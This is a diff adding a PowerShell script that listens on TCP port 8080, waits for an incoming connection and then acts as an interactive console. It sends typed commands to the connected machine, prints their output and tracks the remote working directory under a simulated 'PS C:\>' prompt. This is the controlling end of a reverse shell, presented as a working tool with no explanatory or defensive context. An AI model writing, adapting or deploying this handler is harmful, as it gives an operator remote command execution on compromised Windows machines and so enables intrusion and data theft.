@@ -1,0 +1,62 @@
+$port = 8080
+$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
+$listener.Start()
+Write-Host "Listening on port $port..."
+
+$client = $listener.AcceptTcpClient()
+$stream = $client.GetStream()
+$buffer = New-Object byte[] 2048
+$encoding = [System.Text.Encoding]::UTF8
+
+Write-Host "Connection received from $($client.Client.RemoteEndPoint)`n"
+
+# Default prompt path
+$currentPath = "C:\\"
+
+function Send-Command {
+    param ($command)
+
+    $cmdBytes = $encoding.GetBytes($command + "`n")
+    $stream.Write($cmdBytes, 0, $cmdBytes.Length)
+    $stream.Flush()
+}
+
+function Receive-Output {
+    $output = ""
+    Start-Sleep -Milliseconds 300
+    while ($stream.DataAvailable) {
+        $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+        if ($bytesRead -gt 0) {
+            $data = $encoding.GetString($buffer, 0, $bytesRead)
+            $output += $data
+        }
+    }
+    return $output
+}
+
+while ($client.Connected) {
+    # Show simulated PowerShell prompt
+    Write-Host -NoNewline "`nPS $currentPath> "
+    $cmd = Read-Host
+    if ($cmd -eq 'exit') { break }
+
+    # Send command and print output
+    Send-Command $cmd
+    $output = Receive-Output
+    Write-Host -NoNewline $output
+
+    # Update currentPath using pwd
+    Send-Command 'pwd'
+    $pwdOutput = Receive-Output
+
+    # Extract last non-empty line (should be path)
+    $lines = $pwdOutput -split "`r?`n"
+    foreach ($line in ($lines | Where-Object { $_.Trim() -ne "" } | Select-Object -Last 1)) {
+        if ($line -match '^[A-Z]:\\') {
+            $currentPath = $line.Trim()
+        }
+    }
+}
+$client.Close()
+$listener.Stop()
+Write-Host "`nConnection closed."
